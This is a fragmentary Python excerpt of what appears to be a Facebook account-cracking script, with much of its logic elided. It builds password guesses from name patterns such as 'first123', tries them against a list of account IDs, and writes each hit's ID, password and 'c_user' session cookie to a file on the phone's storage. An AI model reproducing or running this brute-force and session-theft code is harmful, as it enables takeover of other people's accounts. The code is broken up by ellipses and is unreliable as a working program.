...
def crack_file():
        try:
                ...
                if x == ("sex"):
                                ...
                                linex()
                                file = input('[•] Put location :/sdcard/')
                                try:
                                ...
                                try:
                                        ps_limit = int(input('[*] Please Put Your Password Limit : 5'))
                                        os.system('clear')
                                        print(logo)
                                except:
                                        ps_limit =1
                                ...
                                for i in range(ps_limit):
                                        ...
                                        plist.append(input('first last'))
                                        plist.append(input('firstlast'))
                                        plist.append(input('first123'))
                                        plist.append(input('first1234'))
                                        plist.append(input('first12345'))
                                os.system('clear')
                                print(logo)                                
                                cx=('y')
                                if cx in ['y','y','1','n','n']:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SXB:
                                ...
                                open("/sdcard/OK_Cookie.txt", "a").write(ids + '|' + pas + ' | ' + coki + "\n")                            
                                oks.append(ids)
